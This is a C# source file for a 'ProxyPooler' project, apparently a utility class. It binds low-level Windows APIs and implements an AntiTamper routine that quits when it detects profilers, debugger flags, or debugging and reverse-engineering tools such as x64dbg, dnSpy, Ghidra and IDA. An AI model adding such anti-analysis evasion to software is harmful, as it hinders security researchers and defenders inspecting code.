using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ProxyPooler
{
    internal class Memory
    {
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowTextLengthA(IntPtr HWND);
        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowTextA(IntPtr HWND, StringBuilder WindowText, int nMaxCount);
        [DllImport("ntdll.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern void RtlInitUnicodeString(out UNICODE_STRING DestinationString, string SourceString);
        [DllImport("ntdll.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern void RtlUnicodeStringToAnsiString(out ANSI_STRING DestinationString, UNICODE_STRING UnicodeString, bool AllocateDestinationString);
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint LdrGetDllHandle([MarshalAs(UnmanagedType.LPWStr)] string DllPath, [MarshalAs(UnmanagedType.LPWStr)] string DllCharacteristics, UNICODE_STRING LibraryName, ref IntPtr DllHandle);
        [DllImport("ntdll.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern uint LdrGetProcedureAddress(IntPtr Module, ANSI_STRING ProcedureName, ushort ProcedureNumber, out IntPtr FunctionHandle);
        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, [MarshalAs(UnmanagedType.U4)] MemoryProtection flNewProtect, [MarshalAs(UnmanagedType.U4)] out MemoryProtection lpflOldProtect);
        [DllImport("ntdll.dll", CharSet = CharSet.Auto)]
        private static extern int NtQueryInformationProcess(IntPtr test, int test2, int[] test3, int test4, ref int test5);
        internal enum MemoryProtection
        {
            ExecuteReadWrite = 0x40
        }
        private static async Task<IntPtr> LowLevelGetModuleHandle(string Library)
        {
            IntPtr DllHandle = IntPtr.Zero;
            UNICODE_STRING DestinationString = default(UNICODE_STRING);
            RtlInitUnicodeString(out DestinationString, Library);
            LdrGetDllHandle(null, null, DestinationString, ref DllHandle);
            return DllHandle;
        }
        private static async Task<IntPtr> LowLevelGetProcAddress(IntPtr hModule, string Function)
        {
            IntPtr FunctionHandle = IntPtr.Zero;
            UNICODE_STRING DestinationString = default(UNICODE_STRING);
            ANSI_STRING DestinationString2 = default(ANSI_STRING);
            RtlInitUnicodeString(out DestinationString, Function);
            RtlUnicodeStringToAnsiString(out DestinationString2, DestinationString, AllocateDestinationString: true);
            LdrGetProcedureAddress(hModule, DestinationString2, 0, out FunctionHandle);
            return FunctionHandle;
        }
        private unsafe static void CopyBlock(void* destination, void* source, uint byteCount)
        {
        }
        private unsafe static void InitBlock(void* startAddress, byte value, uint byteCount)
        {
        }
        public static void AntiTamper()
        {
            if (Environment.GetEnvironmentVariable("complus_profapi_profilercompatibilitysetting") != null)
            {
                Environment.Exit(0);
            }
            if (string.Compare(Environment.GetEnvironmentVariable("COR_ENABLE_PROFILING"), "1", StringComparison.Ordinal) == 0)
            {
                Environment.Exit(0);
            }
            int[] array = new int[6];
            int test = 0;
            IntPtr handle = Process.GetCurrentProcess().Handle;
            if (NtQueryInformationProcess(handle, 31, array, 4, ref test) == 0 && array[0] != 1)
            {
                Environment.Exit(0);
            }
            if (NtQueryInformationProcess(handle, 30, array, 4, ref test) == 0 && array[0] != 0)
            {
                Environment.Exit(0);
            }
            string[] array2 = new string[12]
            {
            "x32dbg", "x64dbg", "windbg", "ollydbg", "dnspy", "immunity debugger", "hyperdbg", "debug", "debugger", "ghidra",
            "Ghidra", "ida"
            };
            IntPtr foregroundWindow = GetForegroundWindow();
            int windowTextLengthA = GetWindowTextLengthA(foregroundWindow);
            if (windowTextLengthA != 0)
            {
                StringBuilder stringBuilder = new StringBuilder(windowTextLengthA + 1);
                GetWindowTextA(foregroundWindow, stringBuilder, windowTextLengthA + 1);
                string[] array3 = array2;
                foreach (string value in array3)
                {
                    if (stringBuilder.ToString().ToLower().Contains(value))
                    {
                        Environment.Exit(0);
                    }
                }
            }
        }
        private struct CONTEXT
        {
            private uint P1Home;

            private uint P2Home;

            private uint P3Home;

            private uint P4Home;

            private uint P5Home;

            private uint P6Home;

            private long ContextFlags;

            private uint Dr0;

            private uint Dr1;

            private uint Dr2;

            private uint Dr3;

            private uint Dr4;

            private uint Dr5;

            private uint Dr6;

            private uint Dr7;
        }

        private struct PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY
        {
            private uint MicrosoftSignedOnly;
        }

        [StructLayout(LayoutKind.Explicit)]
        private struct SYSTEM_CODEINTEGRITY_INFORMATION
        {
            [FieldOffset(0)]
            private ulong Length;

            [FieldOffset(4)]
            private uint CodeIntegrityOptions;
        }

        private struct PROCESS_BASIC_INFORMATION
        {
            internal IntPtr Reserved1;

            internal IntPtr PebBaseAddress;

            internal IntPtr Reserved2_0;

            internal IntPtr Reserved2_1;

            internal IntPtr UniqueProcessId;

            internal IntPtr InheritedFromUniqueProcessId;
        }

        private struct SYSTEM_KERNEL_DEBUGGER_INFORMATION
        {
            [MarshalAs(UnmanagedType.U1)]
            private bool KernelDebuggerEnabled;

            [MarshalAs(UnmanagedType.U1)]
            private bool KernelDebuggerNotPresent;
        }

        public struct UNICODE_STRING
        {
            private ushort Length;

            private ushort MaximumLength;

            private IntPtr Buffer;
        }

        public struct ANSI_STRING
        {
            private short Length;

            private short MaximumLength;

            private string Buffer;
        }
    }
}
